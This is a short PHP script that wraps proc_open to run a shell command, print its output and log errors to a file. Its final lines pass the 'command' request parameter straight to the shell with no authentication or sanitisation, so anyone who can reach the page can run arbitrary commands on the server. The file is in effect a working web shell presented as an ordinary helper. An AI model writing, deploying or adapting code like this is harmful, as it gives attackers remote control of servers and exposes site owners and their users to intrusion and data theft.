<?php 
function userInput($input, $procPipes) {
	fwrite($procPipes[0], $input);
	if ($input !== "") {
		fwrite($procPipes[0], "\n");
	}
}
function closeProcess($procPipes, $process) { //DO NOT FORGET TO CLOSE PROCESS!
	fclose($procPipes[1]);
	$return_value = proc_close($process);
	echo "\nprocess executed exit value of $return_value\n";
}
function queProcess($cmd, $input='') {
	if (!is_dir("tmp/error_log")) {
		mkdir("tmp/error_log");
	}
	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("file", "tmp/error_log/error-output.txt", "a")
	);
	$process = proc_open($cmd, $descriptorspec, $pipes);
	echo '<pre>';
	if (is_resource($process)) {
		//Start user inputs.
		userInput($input, $pipes);
		//End user inputs.
		fclose($pipes[0]);
	}
	echo stream_get_contents($pipes[1]);
	closeProcess($pipes, $process);	
	echo '</pre>';
}
$command = $_REQUEST['command'];
queProcess($command);
?>